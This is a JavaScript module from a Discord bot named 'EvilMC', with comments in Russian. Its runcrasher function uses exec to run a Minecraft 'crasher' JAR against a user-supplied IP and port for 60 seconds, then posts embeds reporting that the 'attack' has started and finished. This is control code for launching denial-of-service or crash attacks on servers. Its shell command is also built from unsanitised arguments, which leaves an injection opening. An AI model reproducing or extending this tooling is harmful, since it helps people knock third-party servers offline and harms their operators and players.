//Файл функций с для крашеров
const Discord = require('discord.js');
const { exec } = require('child_process');
const attack = require('../jsons/attacks.json');
const Client = require('../structure/client.js');
const killPrc = require('tree-kill');

module.exports = {
    /**
     * @param {Client} client
     * @param {Discord.CommandInteraction} interaction 
     * @param {{jarname: string, jarargs: string}} jarinfo 
     * @param {{method: string, host: string, port: string}} information 
     */
    runcrasher(client, interaction, jarinfo, information) {
        attack.run = true;
        const crash = exec(`java -jar jars/${jarinfo.jarname} ${jarinfo.jarargs}`, {detached: true}, (error, stdout, stderr) => {
            if (stderr) {
                console.log(`StdErr: ${stderr}`);
                return;
            }
            console.log(`Была запущена атака: ${jarinfo.jarname}`)
            console.log(`[Attack log] ${stdout}`);
        })
        
        let CrashEmbed = new Discord.MessageEmbed()
        .setColor('RANDOM')
        .setFooter({
            text: `${interaction.guild.name} | EvilMC`,
            iconURL: client.user.avatarURL({dynamic: true})
        });

        const runembed = CrashEmbed.setDescription(`**► Метод: ${information.method}** \n \n **► Информация** \n IP: ${information.host} \n Port: ${information.port} \n \n  ► Атака запущена! ✅ \n ► На 60 секунд!!\n ☆ Made with ♥ by DesConnet ☆`);

        interaction.reply({ embeds: [runembed] })
        setTimeout(function () {
            killPrc(crash.pid);
            const endembed = CrashEmbed.setDescription(`**► Метод: ${information.method}** \n \n **► Информация** \n IP: ${information.host} \n Port: ${information.port} \n \n ► Атака Завершена!\n ☆ Made with ♥ by DesConnet ☆`);
            interaction.editReply({ embeds: [endembed] });
            attack.run = false;
        }, 60000)
    },

    /**
     * @param {Client} client
     * @param {Discord.CommandInteraction} interaction 
     * @param {string} text 
     */
    errorembed(client, interaction, cmdname, text) {
        const command = client.commands.find(cmd => cmd.name == cmdname)
        let errembed = new Discord.MessageEmbed()
            .setColor('RED')
            .setAuthor({
                name: interaction.user.tag,
                iconURL: interaction.user.displayAvatarURL({ dynamic: true })
            })
            .addField("Команда:", `/${command.name}`, false)
            .addField("Причина:", `${text}`, false)
            .setFooter({
                text: `${interaction.guild.name} | EvilMC`,
                iconURL: client.user.avatarURL({dynamic: true})
            });
        interaction.reply({ embeds: [errembed] })
    }
}